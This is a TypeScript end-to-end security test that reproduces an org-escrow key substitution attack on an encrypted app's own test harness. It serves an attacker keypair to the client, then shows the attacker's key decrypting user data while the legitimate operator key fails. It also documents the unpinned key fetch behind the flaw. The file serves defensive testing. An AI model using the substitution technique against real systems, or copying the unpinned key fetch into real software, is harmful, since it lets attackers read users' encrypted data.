/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

/**
 * A2 — org escrow key substitution (C11, C2). **Claim C11 is NOT upheld: the
 * documented residual is fully exploitable.**
 *
 * C11 says the client fetches the escrow public key "from the server it is
 * defending against — pinning, TOFU, or out-of-band verification must carry
 * that weight." Nothing carries it: `buildOrgEnvelope` (src/services/encryption
 * .ts) passes whatever `GET /encryption/org-key` returns straight into
 * `wrapAKForOrg`, with no pinning, no TOFU, and no fingerprint check. A2's
 * defining power — "lies about ... org-escrow public key" — is enough to escrow
 * every account's AK to a key the attacker holds.
 *
 * This spec substitutes an attacker P-256 keypair on the wire, completes
 * first-device setup, and shows:
 *   1. the offline operator tool with the ATTACKER private key recovers row
 *      plaintext (the AK was escrowed to the attacker), and
 *   2. the LEGITIMATE operator key can no longer recover it — escrow was
 *      silently redirected, not duplicated, and
 *   3. the stored `key_fingerprint` is the LEGIT one (the backend stamps its own
 *      via `persistOrgEnvelope`, ignoring the client), so an operator auditing
 *      the fingerprint gets no warning — false assurance.
 *
 * If Phase 5 adds pinning/TOFU, invert assertion 1 (attacker key must fail) and
 * this becomes the regression test proving the pin holds.
 *
 * Requires the PowerSync + Postgres harness with ORG_ESCROW_ENABLED. Run with:
 *   bash scripts/run-e2ee-powersync.sh attacks/org-key-substitution.spec.ts
 */

import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { expect, test } from '../fixtures'
import { getTaskIds, waitForNewEncryptedTasks, waitForOrgEnvelope, waitForUserId } from '../db'
import {
  completeFirstDeviceSetup,
  createE2eeEmail,
  createTask,
  enableTasks,
  loginViaConsumerOtp,
  serveEvilOrgKey,
} from '../helpers'
import { testOrgEscrowFingerprint, testOrgEscrowPrivateKey } from '../org-escrow-key'

const execFileAsync = promisify(execFile)

/**
 * The attacker's operator keypair, in the frozen THU-804 wire contract (mirrors
 * scripts/org-escrow-keygen.ts): ECDH P-256, public exported raw (65 bytes),
 * private exported PKCS8, fingerprint = base64(SHA-256(raw public)). Generated
 * fresh per run so nothing secret is committed.
 */
const generateAttackerEscrowKeypair = async (): Promise<{
  publicKey: string
  privateKey: string
  fingerprint: string
}> => {
  const keypair = await crypto.subtle.generateKey({ name: 'ECDH', namedCurve: 'P-256' }, true, ['deriveBits'])
  const publicRaw = new Uint8Array(await crypto.subtle.exportKey('raw', keypair.publicKey))
  const privatePkcs8 = new Uint8Array(await crypto.subtle.exportKey('pkcs8', keypair.privateKey))
  const digest = new Uint8Array(await crypto.subtle.digest('SHA-256', publicRaw))
  return {
    publicKey: Buffer.from(publicRaw).toString('base64'),
    privateKey: Buffer.from(privatePkcs8).toString('base64'),
    fingerprint: Buffer.from(digest).toString('base64'),
  }
}

const postgresPort = process.env.E2E_POSTGRES_PORT ?? '5434'
const databaseUrl = `postgresql://postgres:postgres@localhost:${postgresPort}/postgres`

/** Run the offline operator decrypt tool with a chosen private key; returns trimmed stdout. */
const runEscrowDecrypt = async (params: {
  userId: string
  table: string
  column: string
  rowId: string
  privateKey: string
}) => {
  const { stdout } = await execFileAsync('bun', [
    'scripts/org-escrow-decrypt.ts',
    '--user-id',
    params.userId,
    '--table',
    params.table,
    '--column',
    params.column,
    '--row-id',
    params.rowId,
    '--db-url',
    databaseUrl,
    '--private-key',
    params.privateKey,
  ])
  return stdout.trim()
}

test.describe.serial('A2 — org escrow key substitution', () => {
  test('a substituted org key escrows the AK to the attacker, not the operator', async ({ page }) => {
    const email = createE2eeEmail()
    const taskText = `Escrow-hijacked task ${crypto.randomUUID()}`

    // A2 lies about the org public key: the client wraps the AK to a key only
    // the attacker holds the private half of.
    const attacker = await generateAttackerEscrowKeypair()
    await serveEvilOrgKey(page.context(), { publicKey: attacker.publicKey, fingerprint: attacker.fingerprint })

    await loginViaConsumerOtp(page, email)
    const userId = await waitForUserId(email)
    await completeFirstDeviceSetup(page)

    // The envelope persisted — and carries the LEGIT fingerprint, because the
    // backend stamps its own (`persistOrgEnvelope`) over whatever the client
    // sent. The attacker-wrapped blob is mislabeled as the operator's: an
    // operator auditing this fingerprint sees nothing wrong.
    const orgEnvelope = await waitForOrgEnvelope(userId)
    expect(orgEnvelope.keyFingerprint).toBe(testOrgEscrowFingerprint)
    expect(orgEnvelope.keyFingerprint).not.toBe(attacker.fingerprint)

    await enableTasks(page)
    const taskIdsBefore = await getTaskIds(userId)
    await createTask(page, taskText)
    const newRows = await waitForNewEncryptedTasks(userId, taskIdsBefore)
    expect(newRows.length).toBeGreaterThan(0)
    const encryptedRow = newRows[0]
    expect(encryptedRow.item).toMatch(/^__enc:v2:0:/)
    expect(encryptedRow.item).not.toContain(taskText)

    // THE EXPLOIT: the attacker's private key recovers the AK and the plaintext.
    const recovered = await runEscrowDecrypt({
      userId,
      table: 'tasks',
      column: 'item',
      rowId: encryptedRow.id,
      privateKey: attacker.privateKey,
    })
    expect(recovered).toContain(taskText)

    // ...and escrow was REDIRECTED, not duplicated: the legitimate operator key
    // can no longer unwrap this account's AK. The intended recovery holder is
    // locked out while the attacker is in.
    await expect(
      runEscrowDecrypt({
        userId,
        table: 'tasks',
        column: 'item',
        rowId: encryptedRow.id,
        privateKey: testOrgEscrowPrivateKey,
      }),
    ).rejects.toThrow()
  })
})
